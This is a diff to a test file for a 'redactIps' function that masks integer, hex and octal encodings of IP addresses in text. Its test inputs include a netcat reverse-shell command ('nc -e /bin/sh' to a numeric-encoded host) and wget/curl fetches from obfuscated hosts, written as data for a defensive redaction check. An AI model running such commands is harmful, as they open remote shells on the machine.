@@ -39,8 +39,24 @@ describe('redactIps', () => {
     expect(redactIps('wget http://2130706433/x').text).toBe('wget http://‹ip›/x')
     expect(redactIps('curl http://0x7f000001/p').text).toBe('curl http://‹ip›/p')
     expect(redactIps('get http://0177.0.0.1/').text).toBe('get http://‹ip›/')
-    // The attacker IP must be gone; a bare integer in path text is untouched.
-    expect(redactIps('echo 2130706433').count).toBe(0)
+  })
+
+  it('masks schemeless numeric-encoded hosts dropped after the shell command', () => {
+    const r = redactIps('nc -e /bin/sh 2130706433 4444')
+    expect(r.text).toBe('nc -e /bin/sh ‹ip› 4444')
+    expect(r.count).toBe(1)
+    expect(redactIps('nc 0x7f000001 4444').text).toBe('nc ‹ip› 4444')
+    expect(redactIps('curl ftp://2130706433/x').text).toBe('curl ftp://‹ip›/x')
+  })
+
+  it('does NOT mask ordinary shell numbers as schemeless IP hosts', () => {
+    for (const s of ['chmod 777 x', 'sleep 30', 'dd bs=1024', 'id=12345']) {
+      const r = redactIps(s)
+      expect(r.count).toBe(0)
+      expect(r.text).toBe(s)
+    }
+    // 10-digit but above the valid IPv4-as-integer range (> 4294967295): not an IP.
+    expect(redactIps('echo 9999999999').count).toBe(0)
   })
 
   it('does NOT over-mask a 5+ segment dotted version string', () => {
